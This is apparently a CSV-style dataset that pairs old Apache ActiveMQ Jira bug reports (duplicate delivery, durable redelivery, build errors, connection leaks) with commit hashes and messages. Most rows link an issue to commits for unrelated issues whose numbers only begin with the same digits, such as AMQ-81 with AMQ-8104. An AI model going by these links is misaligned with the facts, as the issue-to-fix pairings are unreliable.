If you pass -Dsubject=MyTopic things work perfectly. Though with queues, the consumer seems to get the messages, yet they are not messages 1..100 but instead are like 20 copies of message 39 etc. i.e. lots of duplicates seem to be dispatched for some reason. Something wierd going on.",e8bae06604e3d1dee6007b9a23b5476fcdcde5d0,"Added unit test for consuming expired topic and queue. - AMQ-936

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@451612 13f79535-47bb-0310-9956-ffa450edef68"
12481240,AMQ-91,"When configuring three or more brokers in a cluster we can receive a lot of duplicate Topic messages. 

This is due to the fact that a broker marks a message as visited when it receives it. This is not a problem for queue message, however for topic messages this becomes a problem since messages are distributed on all the server channels that the broker is aware of (and that the message has not visited?). This means that for three brokers we will get two duplicate deliveries for four broker we will get 12(3x4)? duplicates for five brokers we will get 60(3x4x5)? duplicates.

Increasing the number of connected brokers in a cluster will have a severe impact in performance...

Is it possible for the broker to mark topic messages as visited by all the brokers that it will send the message to excluding the one it is about to send to? This way the broker that receives a topic message wont send it to the brokers that have already received it(is about to receive it).",1a88ac6ac383eccf8a026368c894f8f21646cd3c,"Commiting awesome patch by Sepand Mavandadi to add ActiveMQ support for SSL authentication and authorization: https://issues.apache.org/activemq/browse/AMQ-912

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@447608 13f79535-47bb-0310-9956-ffa450edef68"
12481138,AMQ-81,"Started the server with:
 maven server -Dconfig=src\sample-conf\bdb-example.xml

Then published some messages with:
 maven producer -Dtopic=false -Ddurable=true -Durl=tcp://localhost:61401

Restarted the server and then ran the consumer with:
 maven consumer -Dtopic=false -Ddurable=true -Durl=tcp://localhost:61401

The consumer recieved the expected 10 messages.  I then restarted the server and then ran the consumer again and unexpectedly, I received the the 10 message again.",75fde7165e9541da926ecc9763c905b9783f4c82,"http://issues.apache.org/activemq/browse/AMQ-810


git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@420721 13f79535-47bb-0310-9956-ffa450edef68"
12481138,AMQ-81,"Started the server with:
 maven server -Dconfig=src\sample-conf\bdb-example.xml

Then published some messages with:
 maven producer -Dtopic=false -Ddurable=true -Durl=tcp://localhost:61401

Restarted the server and then ran the consumer with:
 maven consumer -Dtopic=false -Ddurable=true -Durl=tcp://localhost:61401

The consumer recieved the expected 10 messages.  I then restarted the server and then ran the consumer again and unexpectedly, I received the the 10 message again.",651c5ff2cfe72c0de5f4f486c965cdbb80ceba0d,"- Tests AMQ-8104
- Fixes AMQ-8104"
12481138,AMQ-81,"Started the server with:
 maven server -Dconfig=src\sample-conf\bdb-example.xml

Then published some messages with:
 maven producer -Dtopic=false -Ddurable=true -Durl=tcp://localhost:61401

Restarted the server and then ran the consumer with:
 maven consumer -Dtopic=false -Ddurable=true -Durl=tcp://localhost:61401

The consumer recieved the expected 10 messages.  I then restarted the server and then ran the consumer again and unexpectedly, I received the the 10 message again.",944ca6c7e1dc4f44b61ce05b77c180c686e2ae76,"AMQ-8183 - prevent infinite loop when maxFrameSize is exceeded

This makes sure the nio transport thread properly terminates if
maxFrameSize is exceeded with OpenWire to prevent an infinite loop that
uses up all the cpu"
12481138,AMQ-81,"Started the server with:
 maven server -Dconfig=src\sample-conf\bdb-example.xml

Then published some messages with:
 maven producer -Dtopic=false -Ddurable=true -Durl=tcp://localhost:61401

Restarted the server and then ran the consumer with:
 maven consumer -Dtopic=false -Ddurable=true -Durl=tcp://localhost:61401

The consumer recieved the expected 10 messages.  I then restarted the server and then ran the consumer again and unexpectedly, I received the the 10 message again.",2712464b78f76affd34cc0b097a2248f211ea0c7,"AMQ-8183 - apply maxFrameSize high cpu usage fix to Auto nio transport
also"
12481138,AMQ-81,"Started the server with:
 maven server -Dconfig=src\sample-conf\bdb-example.xml

Then published some messages with:
 maven producer -Dtopic=false -Ddurable=true -Durl=tcp://localhost:61401

Restarted the server and then ran the consumer with:
 maven consumer -Dtopic=false -Ddurable=true -Durl=tcp://localhost:61401

The consumer recieved the expected 10 messages.  I then restarted the server and then ran the consumer again and unexpectedly, I received the the 10 message again.",7ca7118a9544fd6b2aac4dd72fd3a6edc3369aca,AMQ-8117 - Allow java.util arrays for deserialization
12481138,AMQ-81,"Started the server with:
 maven server -Dconfig=src\sample-conf\bdb-example.xml

Then published some messages with:
 maven producer -Dtopic=false -Ddurable=true -Durl=tcp://localhost:61401

Restarted the server and then ran the consumer with:
 maven consumer -Dtopic=false -Ddurable=true -Durl=tcp://localhost:61401

The consumer recieved the expected 10 messages.  I then restarted the server and then ran the consumer again and unexpectedly, I received the the 10 message again.",2e169f0bc3db3e16fe2928ac03b3308c69b5e72a,[AMQ-8138] Set client IP address with Stomp host header
12481231,AMQ-80,"Started the server with:
 maven server -Dconfig=src\sample-conf\jdbm-example.xml

Then published some messages with:
 maven producer -Dtopic=false -Ddurable=true

Restarted the server and then ran the consumer with:
 maven consumer -Dtopic=false -Ddurable=true

Expected the consumer to receive the 10 message published by the producer but it did not receive any.",d320676ae1d031f61f7ee099b5aedf844a874296,"http://issues.apache.org/activemq/browse/AMQ-800


git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@419761 13f79535-47bb-0310-9956-ffa450edef68"
12481231,AMQ-80,"Started the server with:
 maven server -Dconfig=src\sample-conf\jdbm-example.xml

Then published some messages with:
 maven producer -Dtopic=false -Ddurable=true

Restarted the server and then ran the consumer with:
 maven consumer -Dtopic=false -Ddurable=true

Expected the consumer to receive the 10 message published by the producer but it did not receive any.",07529a5f05cc3940c0ce0c73aecdf26959b983bf,"AMQ-801: Bundle activemq-jaas with dsitro

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@469670 13f79535-47bb-0310-9956-ffa450edef68"
12481231,AMQ-80,"Started the server with:
 maven server -Dconfig=src\sample-conf\jdbm-example.xml

Then published some messages with:
 maven producer -Dtopic=false -Ddurable=true

Restarted the server and then ran the consumer with:
 maven consumer -Dtopic=false -Ddurable=true

Expected the consumer to receive the 10 message published by the producer but it did not receive any.",3218a93ba2a76244225833cf4b6d3874886c84ae,[AMQ-8090] Add a release validation script
12481231,AMQ-80,"Started the server with:
 maven server -Dconfig=src\sample-conf\jdbm-example.xml

Then published some messages with:
 maven producer -Dtopic=false -Ddurable=true

Restarted the server and then ran the consumer with:
 maven consumer -Dtopic=false -Ddurable=true

Expected the consumer to receive the 10 message published by the producer but it did not receive any.",0146d5eb3e69e086ec19df1df1b2b7966c644d26,[AMQ-8060] Re add allowLinkStealing on transport connector for backward compatibility
12481231,AMQ-80,"Started the server with:
 maven server -Dconfig=src\sample-conf\jdbm-example.xml

Then published some messages with:
 maven producer -Dtopic=false -Ddurable=true

Restarted the server and then ran the consumer with:
 maven consumer -Dtopic=false -Ddurable=true

Expected the consumer to receive the 10 message published by the producer but it did not receive any.",9b6a48ad31b2fb4b3a5a129d4ed6119024c6850a,[AMQ-8032] Add JAXB in lib by default to avoid issue with JDK11
12481492,AMQ-77,"we should be able to use an embedded broker in an ActiveMQConnectionFactory and use any URL to connect to it; yet there seems a bug somewhere.

e.g. if I use

factory.brokerURL = ""tcp://localhost:62001""

and use a Spring embedded broker container factory, we get a socket in use.

Is it trying to make 2 brokers maybe?",d3d58fe41d2e946f87abcbf1001be51e18749075,"Test case and Fix for https://issues.apache.org/activemq/browse/AMQ-777


git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@587216 13f79535-47bb-0310-9956-ffa450edef68"
12481137,AMQ-74,We should clone() the object on createObjectMessage() to avoid any possible issues due to the mutation of the object between the sending of the message and the creation of the ObjectMessage,b7dca5e0738639f2bffe7f97b9c782372fc2188e,[AMQ-7400] Fix OSGi statement about sun.rmi
12481137,AMQ-74,We should clone() the object on createObjectMessage() to avoid any possible issues due to the mutation of the object between the sending of the message and the creation of the ObjectMessage,e6befbc8750127d3f1a0a36eec91507b57aef2ab,AMQ-7404 add debug logging for selectors loaded from the cache file
12481137,AMQ-74,We should clone() the object on createObjectMessage() to avoid any possible issues due to the mutation of the object between the sending of the message and the creation of the ObjectMessage,1f2e9be784fb0dc20fe48be2a9a35946446641d7,AMQ-7411 - Avoid leaking Hadoop test dependency
12481137,AMQ-74,We should clone() the object on createObjectMessage() to avoid any possible issues due to the mutation of the object between the sending of the message and the creation of the ObjectMessage,ae96af6d0fb75669cfa056ddfa6502ecf44270b3,"[AMQ-7409] Exclude netty from zookeeper dependency

Credit To: Piyush Chugh <chughpiyush>"
12481137,AMQ-74,We should clone() the object on createObjectMessage() to avoid any possible issues due to the mutation of the object between the sending of the message and the creation of the ObjectMessage,cb23db5c5deb33b2201ba5aa13847d470c2317de,[AMQ-7429] Align spring-expression version with other spring artifacts
12481137,AMQ-74,We should clone() the object on createObjectMessage() to avoid any possible issues due to the mutation of the object between the sending of the message and the creation of the ObjectMessage,910a028fa7dd9659044f4e44392197830d9b463e,[AMQ-7476] Add http schema in the HTTP registry
12481137,AMQ-74,We should clone() the object on createObjectMessage() to avoid any possible issues due to the mutation of the object between the sending of the message and the creation of the ObjectMessage,a7b06c043c34978125b57016a8bd82d9bb2fa6a5,AMQ-7497 - tidy up test cleanup for random order runs
12481137,AMQ-74,We should clone() the object on createObjectMessage() to avoid any possible issues due to the mutation of the object between the sending of the message and the creation of the ObjectMessage,8cc5386fbbe7a836ac9aef3cffcb56c0b9f65adc,AMQ-7497 - further test to verify behaviour after ra.stop
12481137,AMQ-74,We should clone() the object on createObjectMessage() to avoid any possible issues due to the mutation of the object between the sending of the message and the creation of the ObjectMessage,071edf522e0fb82779c01e97479f48bf48493f66,AMQ-7499 add pause/resume operation of a queue in web console
12481166,AMQ-70,"We should use a single consumer per queue to make it easier to load balance message consumption on queues across many HTTP requests.

The current code base of 1 consumer per HTTP sessions only really works well for topics",3fc05469369e4e7296197690d847041762a06f6a,"Applied John Sission's patch: https://issues.apache.org/activemq/browse/AMQ-705 Thanks John!

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@399701 13f79535-47bb-0310-9956-ffa450edef68"
12481166,AMQ-70,"We should use a single consumer per queue to make it easier to load balance message consumption on queues across many HTTP requests.

The current code base of 1 consumer per HTTP sessions only really works well for topics",46160c7b7f66d9d5dda05d2e2dc45e993d3cc48e,[AMQ-7011] Override dispatch to always set dispatchAsync true
12481166,AMQ-70,"We should use a single consumer per queue to make it easier to load balance message consumption on queues across many HTTP requests.

The current code base of 1 consumer per HTTP sessions only really works well for topics",063d21f88062a09b7efc1669608cbbacdeb11aac,[AMQ-7013] Adding unit test
12481166,AMQ-70,"We should use a single consumer per queue to make it easier to load balance message consumption on queues across many HTTP requests.

The current code base of 1 consumer per HTTP sessions only really works well for topics",b6dae3703e358de990bda91fcdf5fdbc6a75545f,[AMQ-7023] Add owasp plugin as profile to AMQ build.
12481166,AMQ-70,"We should use a single consumer per queue to make it easier to load balance message consumption on queues across many HTTP requests.

The current code base of 1 consumer per HTTP sessions only really works well for topics",7974e8c0991dd0bcf2e226ea9b54ff8d740acfc8,AMQ-7004 - Improved logging in Failover Transport
12481166,AMQ-70,"We should use a single consumer per queue to make it easier to load balance message consumption on queues across many HTTP requests.

The current code base of 1 consumer per HTTP sessions only really works well for topics",8f88dcda09760df3aba3306f49a3311fb22a654f,"AMQ-7055 - Optimization on SequenceSet to prevent iterating through the whole set when a value bigger than the last value is added

Signed-off-by: gtully <gary.tully@gmail.com>"
12481166,AMQ-70,"We should use a single consumer per queue to make it easier to load balance message consumption on queues across many HTTP requests.

The current code base of 1 consumer per HTTP sessions only really works well for topics",8e5d539665519629139633e324a672b0a415d4b2,AMQ-7067 - add missing license header
12481166,AMQ-70,"We should use a single consumer per queue to make it easier to load balance message consumption on queues across many HTTP requests.

The current code base of 1 consumer per HTTP sessions only really works well for topics",daea192eefe683a8cba63b5136dc8c2b39722cfe,"AMQ-7085 - Properly start TempUsage inside Queue start

This fix allows temp usage changes to the broker temp usage to propagate
properly to a Queue's temp usage settings

Patch applied with thanks to David Sitsky"
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",b6cb0eacea632239fa6bf3a6c66ba1570c3c9af7,"[AMQ-6702] add maxProducersToAudit and maxAuditDepth to dead letter strategy to cofigure the audit, fix and test"
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",99f3d4c5054bbf401c6460d99574873b604e4b49,"[AMQ-6703] have jmx purge clear the audit such that messages can be copied back, fix and test"
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",56bed30c6427a1cc6b41e0d289a97c3e5b4582c4,"AMQ-6765 Add trace logging of start failure exception

Log the exception at trace level when start fails."
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",8646bb1010d2632f5d405fe1761c2b9c99a0a139,[AMQ-6788] Explain how to fix the problem in the exception
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",63f0b7e20d56837b4f159e83594a4e4fb906cd4a,[AMQ-6792] fire the failover exception handler before stop to ensure blocked write does not block stop request
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",35bd3ad938f5c378b17a34980d2f3480bf3bbfc3,"AMQ-6798 - Clean up store usage object on Queue stop

When queues are stopped the StoreUsage object needs to be stopped so it
will be removed from the parent StoreUsage.  This allows the object to
be garbage collected and prevents a memory leak."
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",33b52b5914b30e73663a344f095a30c1dd484f49,[AMQ-6790] add netty kqueue osgi dependency to the activemq-amqp-client feature
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",e5b7c9fba467d1b9f2db04c01e3863883fd25fc0,"AMQ-6821, AMQ-6790: add the ActiveMQAMQPBrokerFeatureTest to the smoke/sanity test profile"
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",314d5a51688186bf1a21bae0137b3e6cee407f43,AMQ-6707 - skip tracked ack dependent test for leveldb
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",46f8deeb67623e095622debac18f53d736cb3bcc,[AMQ-6780] Add PostgreSQL version JDBC driver name in jdbc store services
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",dc36c19c811dcaab07c27d6f2a0dcdd90f856d3f,[AMQ-6780] This closes #311
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",e1bdb1d89be0754a27c8fd27707c075fdd2f7ccf,"temporarily disabled a test case (AMQ-583) until we can verify it works on all platforms

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@379074 13f79535-47bb-0310-9956-ffa450edef68"
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",5fbce8982c7c94ff4f22c995336e294f9d71fd91,"disabled test due to AMQ-583

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@382359 13f79535-47bb-0310-9956-ffa450edef68"
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",df06bdabdc0e9f892449e0ef0d8783aea6047802,"https://issues.apache.org/jira/browse/AMQ-5816

Apply patch from Ievgen Tarasov that ensures that the data locator is
initialized when a MessageId is deserialized."
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",732fd5684017cd585bfb418950a03ec9a6f44e49,"https://issues.apache.org/jira/browse/AMQ-5839

Disable failing test, broker doesn't currently recover the noLocal state
for a durable subscription."
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",c2310391b9feab44bfaa46e93f0e4ca90d5bf357,"https://issues.apache.org/jira/browse/AMQ-5845

provide server information in connection properties."
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",ffef4dc5fa68cd0e02f4850582fb09db381394da,https://issues.apache.org/jira/browse/AMQ-5844 - patch and test applied with thanks to Ganesh Murthy - ganeshmurthy
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",d919db5e3d8f453c173f6ed82b1e0bce3b3df5fb,"https://issues.apache.org/jira/browse/AMQ-5804

Apply patch from Pavlo Vasylchenko"
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",97b0619b26947c9170230e6969df13116f4a2463,[AMQ-5858] add import package
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",46055034c949c7fbce717c93f5d94b4ca18dd23b,"https://issues.apache.org/jira/browse/AMQ-5837

This commit adds an Inflight message size statistic to SubscriptionStatistics
so we can know the size of all the messages that are inflight, besides just the count."
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",ff9aae69f9da93e2b7500557649a512dddb94dca,"https://issues.apache.org/jira/browse/AMQ-5876 

Add missing license headers to the properties files."
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",de5d0d9430838948196f573c5278c75fbee9f25e,"https://issues.apache.org/jira/browse/AMQ-5854

Fix intermittent test failure caused by the test reconnecting before
the failure assertion had a chance to assert the expected failure"
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",95f58fa7c4e26b5b2d73a80bd8e1cb2bee8ebf47,"https://issues.apache.org/jira/browse/AMQ-6027

Adding back in test case now that AMQ-5898 is resolved"
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",c530b69e16372232bef19dcd353cbe91e4a511d2,"https://issues.apache.org/jira/browse/AMQ-5881

Fail the connect if the password is set but the username bit is not as
per the V3.1.1 spec requirements."
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",1b38b27ed23a5ac604e5a4dd509dd854afdfde07,"https://issues.apache.org/jira/browse/AMQ-5882

Fail to publish if the topic name in the publish packet contains a wild
card character as per the MQTT V3.1 and V3.1.1 spec."
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",8ef44452a24685dea52b0757960c1a750abd4246,"https://issues.apache.org/jira/browse/AMQ-5880

Adds a test for the issue that is ignored for now while we wait for a
fixed MQTT client release."
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",dc68ad89678eba9d18184f1a5342eb7ecf774596,[AMQ-5875] add queue test variant to validate shared mkahaDb remains when one dest is deleted
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,05f6cd6cfc9db677df89fe470f4c3a58bc036d5f,ignore intermittent failures for 5.11 - leveldb can be a focus for 5.12 - https://issues.apache.org/jira/browse/AMQ-5512
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,3e007d89a27f4c74d33862b9967676c683faec51,[AMQ-5514] Add the 5.10.1 release to the spring.schemas file.
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,6466ae2bcfa8831d79f71e94709b0511dc1367cf,"AMQ-5519: use the NOT_FOUND error condition when failing to find a DurableSubscription

